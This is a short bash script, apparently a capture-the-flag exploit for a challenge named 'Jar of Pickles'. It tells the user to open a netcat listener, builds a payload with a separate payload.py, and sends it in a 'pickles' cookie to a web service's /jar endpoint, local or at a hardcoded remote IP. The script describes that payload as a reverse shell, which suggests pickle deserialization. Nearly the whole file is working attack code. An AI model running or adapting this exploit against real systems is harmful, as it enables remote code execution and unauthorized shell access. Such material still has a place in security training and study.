#!/bin/bash

PORT=8007

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.105:'$PORT
elif [[ $# -ne 2 ]]
then
    echo "Usage:"
    echo $0" {local,remote}"
    echo "or"
    echo $0" <ip> <port>"
    exit 1
else
    URL=$1':'$2
fi

# Jar of Pickles
echo "Step 1: Update your own IP and port in \`./payload.py\` so that it could connect to it."
echo "Press any key to continue if you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Step 2: In a new terminal, open a new connection using: \`nc -nvlk <port>\`"
echo "Press any key when you did, to continue"
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done


echo "Now I am sending the reverse shell payload, check the \`nc\` terminal..."
cookie_payload=`python ./payload.py`
curl "$URL"'/jar' -H "Cookie: pickles=$cookie_payload"
